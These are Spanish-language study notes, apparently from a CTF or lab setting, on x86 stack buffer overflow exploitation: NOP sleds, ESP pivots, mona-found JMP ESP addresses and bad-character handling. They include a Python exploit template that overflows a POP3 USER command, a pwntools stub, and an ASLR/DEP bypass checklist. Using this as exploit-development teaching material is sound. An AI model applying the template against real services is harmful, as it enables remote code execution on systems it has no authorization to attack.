
---
Tags: #shellcode #ESP #badcharts #buffer #bufferoverflow #mona #inmunityDebuger #msfvenom 

---

> Contexto: laboratorios/CTF. No ejecutar contra sistemas sin autorización.

---
## Idea esencial (1 línea)

Agregar NOPs y/o desplazar ESP para que, cuando EIP salte a la ubicación controlada, el procesador encuentre un área segura (NOP-sled) y llegue correctamente al shellcode antes de continuar.

---

## Por qué funcionan los NOPs

- `NOP` (`0x90`) no hace nada y consume ciclos.
    
- Un _NOP-sled_ delante del shellcode aumenta la probabilidad de ejecución correcta si la dirección de salto no es exacta.
    
- Facilita tolerancia a errores de EIP/RIP.
    

---

## Desplazamientos en pila (stack adjustments / pivots)

- A veces ESP no apunta exactamente al inicio del shellcode.
    
- Se usan gadgets existentes o pequeños stubs asm para mover ESP (p. ej. `sub esp,0x10` o `add esp,0x10`) y así posicionar el puntero donde está el shellcode.
    
- Esto se logra por dos vías:
    
    1. **Gadget encontrado con mona/ROP**: un `SUB ESP, imm; RET` o `ADD ESP, imm; RET` empaquetado en EIP.
        
    2. **Shellcode stub**: ejecutar un pequeño stub antes del payload que ajuste ESP y luego salte a él.
        

---

## Estrategia práctica (secuencia)

1. Genera shellcode sin badchars.
    
2. Construye payload: `padding hasta EIP` + `addr_jmp_esp` + `NOP-sled` + `stub_de_pivot` (opcional) + `shellcode`.
    
3. Si el salto llega "demasiado pronto" usa NOP más largo o un stack pivot.
    
4. Probar en debugger paso a paso hasta que la CPU entre y ejecute el shellcode.
    

---

## Ejemplo típico (x86, Python)

```python
import struct, socket, time
IP="192.168.1.145"; PORT=110
offset = 260
jmp_esp = 0x625011AF   # dirección encontrada con mona (ejemplo)
shellcode = b"\x90..."  # msfvenom / pwntools, sin badchars

payload = b"A"*offset
payload += struct.pack("<I", jmp_esp)   # sobrescribe EIP
payload += b"\x90"*32                   # NOP-sled
payload += shellcode

s = socket.create_connection((IP,PORT), timeout=3)
_ = s.recv(1024)
s.sendall(b"USER " + payload + b"\r\n")
time.sleep(0.2)
s.close()
```

---

## Ejemplo: short stub para mover ESP (ensamblaje)

- Código ejemplo (ensamblador, x86):  
    `sub esp,0x10` ; reserva 16 bytes  
    `jmp esp` ; salta a ESP
    
- Con pwntools puedes ensamblar:
    
```python
	from pwn import asm 
    stub = asm("sub esp, 0x10; jmp esp")
```
    
- Inserta `stub` dentro del área controlada o usa gadget equivalente en módulo.
    

---

## NOP alternatives (si hay filtros)

- Si `0x90` está filtrado, usar _multi-byte NOPs_ o sleds con instrucciones inofensivas (`INC EAX; DEC EAX`, `XOR EAX,EAX; ADD EAX,0`) según lo permita el target.
    
- Generadores de sleds: pwntools `asm` puede ayudar a crear sleds alternativos.
    

---

## Alineamiento y arquitectura

- x86: empaquetado con `<I` y EIP es 4 bytes.
    
- x64: usar RSP y `struct.pack("<Q", addr)`; cuidado con retoques (no siempre se puede sobrescribir 8 bytes).
    
- Alinear la pila si el shellcode requiere alignment (p. ej. syscalls, SSE).
    

---

## Depuración (qué mirar en Immunity / gdb)

1. Tras crash, comprueba `EIP` contiene la dirección del `JMP ESP` o gadget.
    
2. Comprueba `ESP` apunta dentro del NOP-sled.
    
3. Paso a paso (single-step) hasta ver ejecución del shellcode.
    
4. Si no llega, incrementar NOP-sled o ajustar offset/pivot.
    

---

## Problemas comunes y soluciones rápidas

- **EIP apunta pero no ejecuta shellcode** → NOP-sled insuficiente o ESP fuera del rango. Añadir NOPs o pivot.
    
- **Bytes de dirección contienen badchars** → elegir otra dirección o buscador de opcodes en otro módulo.
    
- **FILTROS (newline, unicode)** → usar encoders o enviar como raw `latin-1`.
    
- **ASLR/DEP** → buscar módulos sin ASLR o usar ROP/mprotect.
    

---

## Checklist mínimo antes de probar RCE

-  Offset correcto.
    
-  Badchars identificados y excluidos.
    
-  Dirección `JMP ESP` elegida y empaquetada sin badchars.
    
-  NOP-sled suficiente.
    
-  Stub/stack-pivot (si es necesario) probado en debugger.
    
-  Shellcode generado y probado localmente.